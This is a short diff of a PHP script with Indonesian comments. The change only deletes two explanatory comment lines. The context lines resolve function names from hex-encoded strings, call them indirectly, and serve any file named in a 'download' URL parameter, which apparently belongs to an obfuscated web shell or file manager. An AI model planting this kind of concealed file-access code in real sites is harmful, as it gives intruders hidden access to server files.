@@ -42,8 +42,6 @@ for ($i = 0; $i < $hitung_array; $i++) {
     $fungsi[] = unhex($Array[$i]);
 }
 
-// Kenapa saya taruh di sini karena function download ini tidak bisa jika di taruh di bawah
-// Karena mempunyai fungsi header
 if (!empty($_GET['download'])) {
     $nameNyafile = basename($_GET['download']);
     $pathFilenya = $fungsi[9]() . "/" . $nameNyafile;
